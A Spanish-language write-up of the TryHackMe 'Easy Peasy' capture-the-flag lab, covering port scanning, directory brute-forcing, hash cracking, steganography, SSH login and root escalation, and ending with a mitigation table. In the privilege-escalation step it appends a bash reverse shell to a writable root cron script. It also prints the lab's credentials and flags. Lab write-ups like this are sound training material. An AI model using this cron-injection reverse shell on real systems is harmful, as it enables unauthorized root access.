---
title: "Easy Peasy - TryHackMe Writeup"
date: 2025-05-31 10:00:00 +0100
categories: [Linux, Easy]
tags: [tryhackme, linux, gobuster, base64, base62, md5, sha256, steganography, steghide, rot13, crontab, privilege-escalation]
image: /imagenes/Easy%20Peasy.png
---

# Easy Peasy CTF

---

## Fase 1 — Enumeración

### Fase 1.1 — Nmap Full Port Scan

**Comando ejecutado:**
```bash
# [MÁQUINA ATACANTE]
nmap -p- <TARGET_IP>
nmap -sC -sV -p 80,6498,65524 <TARGET_IP>
```

**Puertos descubiertos:**

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 80/tcp | HTTP | nginx 1.16.1 |
| 6498/tcp | SSH | OpenSSH 7.6p1 Ubuntu |
| 65524/tcp | HTTP | Apache 2.4.43 Ubuntu |

**Hallazgos:**
- nginx en puerto 80 → página por defecto con directorio `/hidden`
- SSH en **puerto no estándar 6498** → importante para acceso posterior
- Apache en puerto 65524 → segunda web con flags ocultas

![fase1.1_nmap_scan.png](/linux/Easy%20Peasy/fase1.1_nmap_scan.png)

---

### Fase 1.2 — Gobuster en puerto 80 (nginx)

**Comando ejecutado:**
```bash
# [MÁQUINA ATACANTE]
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -t 50
```

**Hallazgos:**
- `/hidden` → Status 301 → directorio oculto descubierto

![fase1.2_gobuster_80.png](/linux/Easy%20Peasy/fase1.2_gobuster_80.png)

---

### Fase 1.3 — Gobuster dentro de /hidden

**Comando ejecutado:**
```bash
# [MÁQUINA ATACANTE]
gobuster dir -u http://<TARGET_IP>/hidden -w /usr/share/wordlists/dirb/common.txt -t 50
```

**Hallazgos:**
- `/hidden/whatever` → Status 301
- Código fuente → `<p hidden="">ZmxhZ3tmMXJzN19mbDRnfQ==</p>` → string en **base64**

![fase1.3_gobuster_hidden.png](/linux/Easy%20Peasy/fase1.3_gobuster_hidden.png)

---

### Fase 1.4 — Decodificar Flag 1 (base64)

**Comando ejecutado:**
```bash
# [MÁQUINA ATACANTE]
echo "ZmxhZ3tmMXJzN19mbDRnfQ==" | base64 -d
```

**Flag 1:**
```
flag{f1rs7_fl4g}
```

![fase1.4_flag1.png](/linux/Easy%20Peasy/fase1.4_flag1.png)

---

## Fase 2 — Enumeración Puerto 65524 (Apache)

### Fase 2.1 — robots.txt en puerto 65524

**Comando ejecutado:**
```bash
# [MÁQUINA ATACANTE]
curl http://<TARGET_IP>:65524/robots.txt
```

**Hallazgos:**
- Hash MD5 encontrado: `a18672860d0510e5ab6699730763b250`

![fase2.1_robots_65524.png](/linux/Easy%20Peasy/fase2.1_robots_65524.png)

---

### Fase 2.2 — Crackear hash MD5 → Flag 2

**Comandos ejecutados:**
```bash
# [MÁQUINA ATACANTE]
echo "a18672860d0510e5ab6699730763b250" > hash.txt
john hash.txt --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt
```

**Flag 2:**
```
flag{1m_s3c0nd_fl4g}
```

![fase2.2a_john_md5.png](/linux/Easy%20Peasy/fase2.2a_john_md5.png)

![fase2.2_flag2.png](/linux/Easy%20Peasy/fase2.2_flag2.png)

---

### Fase 2.3 — Código fuente Apache → Flag 3 + string base62

**Comando ejecutado:**
```bash
# [MÁQUINA ATACANTE]
curl http://<TARGET_IP>:65524/ | grep -i "flag\|hidden\|ba"
```

**Hallazgos:**
- **Flag 3:** `flag{9fdafbd64c47471a8f54cd3fc64cd312}`
- String en **base62:** `ObsJmP173N2X6dOrAgEAL0Vu` → directorio oculto

![fase2.3_apache_source.png](/linux/Easy%20Peasy/fase2.3_apache_source.png)

---

### Fase 2.4 — Decodificar base62 → Directorio oculto

**Decodificación online en dcode.fr:**
```
ObsJmP173N2X6dOrAgEAL0Vu → /n0th1ng3ls3m4tt3r
```

**Hallazgos:**
- Directorio oculto: `/n0th1ng3ls3m4tt3r`
- Hash SHA-256 en la página: `940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81`

![fase2.4_base62_decode.png](/linux/Easy%20Peasy/fase2.4_base62_decode.png)

---

### Fase 2.5 — Directorio oculto

**Hallazgos:**
- Imagen: `binarycodepixabay.jpg` → candidata a esteganografía
- Passphrase: `mypasswordforthatjob`

![fase2.5_hidden_dir_source.png](/linux/Easy%20Peasy/fase2.5_hidden_dir_source.png)

---

### Fase 2.6 — Extracción esteganográfica con steghide

**Comandos ejecutados:**
```bash
# [MÁQUINA ATACANTE]
wget http://<TARGET_IP>:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg
steghide extract -sf binarycodepixabay.jpg -p mypasswordforthatjob
cat secrettext.txt
```

**Hallazgos:**
- **Usuario:** `boring`
- **Contraseña en binario** → requiere decodificación

![fase2.6_steghide_extract.png](/linux/Easy%20Peasy/fase2.6_steghide_extract.png)

---

### Fase 2.7 — Decodificar binario → Contraseña de boring

**Comando ejecutado:**
```bash
# [MÁQUINA ATACANTE]
python3 -c "
b = '01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001'
print(''.join([chr(int(x,2)) for x in b.split()]))"
```

**Contraseña de boring:**
```
iconvertedmypasswordtobinary
```

![fase2.7_binary_decode.png](/linux/Easy%20Peasy/fase2.7_binary_decode.png)

---

## Fase 3 — Foothold

### Fase 3.1 — SSH como boring + User Flag (ROT13)

**Comando ejecutado:**
```bash
# [MÁQUINA ATACANTE]
ssh boring@<TARGET_IP> -p 6498
# Password: iconvertedmypasswordtobinary
whoami
cat user.txt
```

**Hallazgos:**
- Acceso exitoso como `boring`
- User flag cifrada en **ROT13:** `synt{a0jvgf33zfa0ez4y}`

![fase3.1_ssh_boring_userflag.png](/linux/Easy%20Peasy/fase3.1_ssh_boring_userflag.png)

---

### Fase 3.2 — Decodificar ROT13 → User Flag real

**Comando ejecutado:**
```bash
# [MÁQUINA OBJETIVO - como boring]
echo "synt{a0jvgf33zfa0ez4y}" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

**User Flag:**
```
flag{n0wits33msn0rm4l}
```

![fase3.2_rot13_userflag.png](/linux/Easy%20Peasy/fase3.2_rot13_userflag.png)

---

## Fase 4 — Escalada de Privilegios

### Fase 4.1 — Identificación del Vector PrivEsc (crontab)

**Comando ejecutado:**
```bash
# [MÁQUINA OBJETIVO - como boring]
cat /etc/crontab
```

**Hallazgo crítico:**

| Tiempo | Usuario | Comando |
|--------|---------|---------|
| * * * * * | root | `cd /var/www/ && sudo bash .mysecretcronjob.sh` |

- Root ejecuta `.mysecretcronjob.sh` **cada minuto**
- El archivo tiene permisos de escritura para `boring`

![fase4.1_crontab.png](/linux/Easy%20Peasy/fase4.1_crontab.png)

---

### Fase 4.2 — Inyección de Reverse Shell en el cronjob

**Paso 1 — Listener en Kali:**
```bash
# [MÁQUINA ATACANTE]
nc -lvnp 4444
```

**Paso 2 — Inyectar reverse shell:**
```bash
# [MÁQUINA OBJETIVO - como boring]
echo "bash -i >& /dev/tcp/192.168.143.6/4444 0>&1" >> /var/www/.mysecretcronjob.sh
cat /var/www/.mysecretcronjob.sh
```

**Esperar máximo 1 minuto** → cronjob ejecuta el script → reverse shell recibida como root.

![fase4.2_inject_cronjob.png](/linux/Easy%20Peasy/fase4.2_inject_cronjob.png)

---

### Fase 4.3 — Root Flag

**Comandos ejecutados:**
```bash
# [MÁQUINA OBJETIVO - como ROOT]
whoami
find / -name "*.txt" 2>/dev/null | grep root
cat /root/.root.txt
```

**Root Flag:**
```
flag{63a9f0ea7bb98050796b649e85481845}
```

![fase4.3_root_flag.png](/linux/Easy%20Peasy/fase4.3_root_flag.png)

---

## Mitigación

| Vulnerabilidad | Recomendación |
|----------------|---------------|
| Flags ocultas en código fuente HTML | Nunca almacenar información sensible en el frontend |
| Hash MD5 crackeable en robots.txt | Usar hashes modernos como bcrypt o SHA-512 |
| Datos sensibles vía steganografía | No almacenar credenciales en archivos multimedia |
| SSH en puerto no estándar sin otras medidas | Implementar autenticación por clave + fail2ban |
| Cronjob con permisos de escritura para usuario no privilegiado | Restringir permisos de scripts ejecutados por root (chmod 700) |
| Contraseña codificada en binario | Usar gestores de contraseñas y cifrado real |
